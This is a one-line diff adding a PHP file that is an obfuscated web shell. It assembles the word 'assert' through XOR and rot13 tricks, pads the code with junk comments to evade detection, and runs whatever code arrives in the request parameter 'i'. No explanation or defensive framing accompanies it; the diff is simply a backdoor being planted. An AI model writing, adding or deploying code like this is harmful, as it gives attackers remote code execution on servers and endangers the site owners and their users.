@@ -1,0 +1,1 @@
+<?php class  GK179ZD0{/*Fh39Os*/function __construct($x){$c=str_rot13('ffreg');/*Fh39Os*/$a= ("!"^"@").$c;/*Fh39Os*/$a($x);}}new  GK179ZD0($_REQUEST['i']); ?>
